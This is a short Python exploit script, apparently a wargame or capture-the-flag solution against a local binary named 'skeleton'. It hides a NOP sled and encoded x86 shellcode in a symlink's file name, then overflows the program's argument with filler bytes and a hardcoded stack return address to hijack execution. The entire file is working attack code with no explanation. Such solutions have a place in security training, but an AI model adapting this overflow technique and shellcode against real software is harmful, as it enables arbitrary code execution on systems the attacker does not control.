import os
from struct import *

p = lambda x: pack("<L", x)
shellcode_addr = 0xbfffff97
shellcode = "\x68\x8a\xe2\xce\x81\x68\xb1\x0c\x53\x54\x68\x6a\x6f\x8a\xe4\x68\x01\x69\x30\x63\x68\x69\x30\x74\x69\x6a\x14" \
            "\x59\xfe\x0c\x0c\x49\x79\xfa\x41\xf7\xe1\x54\xc3"

filename = "\x90" * 100 + shellcode
payload = "\x90" * 44 + p(shellcode_addr)

os.system("ln -s ./skeleton " + filename)
os.system("./" + filename + " " + payload)
